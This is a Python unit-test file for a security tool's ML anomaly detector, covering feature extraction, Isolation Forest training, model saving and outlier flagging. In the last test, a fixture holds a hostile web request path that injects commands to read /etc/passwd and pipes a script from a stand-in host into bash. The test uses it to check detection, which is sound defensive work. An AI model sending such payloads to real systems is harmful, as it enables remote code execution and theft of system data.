"""Unit and integration tests for ML Anomaly Detection and Feature Pipeline."""

import tempfile
import unittest
from pathlib import Path
import numpy as np

from app.ml.anomaly_detector import ThreatAnomalyDetector
from app.ml.baseline_generator import generate_baseline_dataset
from app.ml.features import (
    FEATURE_NAMES,
    extract_dataset_features,
    extract_features_from_event,
)


class MLAnomalyDetectionTestCase(unittest.TestCase):
    """Test suite verifying ML feature extraction, Isolation Forest training, and outlier detection."""

    def test_feature_extraction_dimensions(self):
        """Verify feature extraction produces proper 1D and 2D numerical vectors."""
        login_event = {
            "timestamp": "2026-10-29T09:12:03Z",
            "event_type": "login",
            "username": "alex",
            "source_ip": "10.0.1.15",
            "success": True,
        }
        vec = extract_features_from_event(login_event, burst_velocity=1)
        self.assertEqual(len(vec), len(FEATURE_NAMES))
        self.assertIsInstance(vec, np.ndarray)
        # 09:12 AM is not off-hours
        self.assertEqual(vec[1], 0.0)  # is_off_hours
        self.assertEqual(vec[2], 0.0)  # is_failure_or_error

    def test_feature_extraction_off_hours_and_failure(self):
        """Verify that 3:00 AM off-hours and failed events are correctly represented in features."""
        night_fail_event = {
            "timestamp": "2026-10-29T03:15:00Z",
            "event_type": "login",
            "username": "root",
            "source_ip": "198.51.100.9",
            "success": False,
        }
        vec = extract_features_from_event(night_fail_event, burst_velocity=5)
        self.assertEqual(vec[1], 1.0)  # is_off_hours
        self.assertEqual(vec[2], 1.0)  # is_failure_or_error

    def test_baseline_dataset_generation(self):
        """Verify synthetic baseline generation produces clean chronologically sorted events."""
        baseline = generate_baseline_dataset(50)
        self.assertEqual(len(baseline), 50)
        self.assertIn("timestamp", baseline[0])
        self.assertIn("source_ip", baseline[0])

    def test_model_training_and_serialization(self):
        """Verify Isolation Forest training, saving to disk, and reloading."""
        baseline = generate_baseline_dataset(100)
        detector = ThreatAnomalyDetector(contamination=0.08)
        self.assertFalse(detector.is_trained())

        metrics = detector.train(baseline)
        self.assertTrue(detector.is_trained())
        self.assertEqual(metrics["training_samples"], 100)

        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_model_file = Path(tmp_dir) / "test_iso_forest.joblib"
            detector.save(tmp_model_file)
            self.assertTrue(tmp_model_file.exists())

            # Load into fresh instance
            reloaded_detector = ThreatAnomalyDetector()
            loaded = reloaded_detector.load(tmp_model_file)
            self.assertTrue(loaded)
            self.assertTrue(reloaded_detector.is_trained())

    def test_anomaly_detection_true_positive(self):
        """Verify that an extreme behavioral outlier is flagged as an anomaly."""
        baseline = generate_baseline_dataset(150)
        detector = ThreatAnomalyDetector(contamination=0.08)
        detector.train(baseline)

        # Inject an extreme outlier: 03:22 AM, long obfuscated payload, special chars, high burst
        extreme_outlier = [
            {
                "timestamp": "2026-10-29T03:22:15Z",
                "event_type": "web_request",
                "source_ip": "198.51.100.250",
                "method": "POST",
                "path": "/api/internal/debug/exec?cmd=cat%20/etc/passwd;id;whoami;curl%20http://malicious.cc/drop.sh|bash",
                "status_code": 500,
            }
        ]
        findings = detector.predict_anomalies(extreme_outlier)
        self.assertEqual(len(findings), 1)
        finding = findings[0]
        self.assertEqual(finding["rule"], "ml_behavioral_anomaly")
        self.assertGreaterEqual(finding["anomaly_score"], 0.60)
        self.assertIn("explanation", finding)
        self.assertIn("mitre", finding)


if __name__ == "__main__":
    unittest.main()

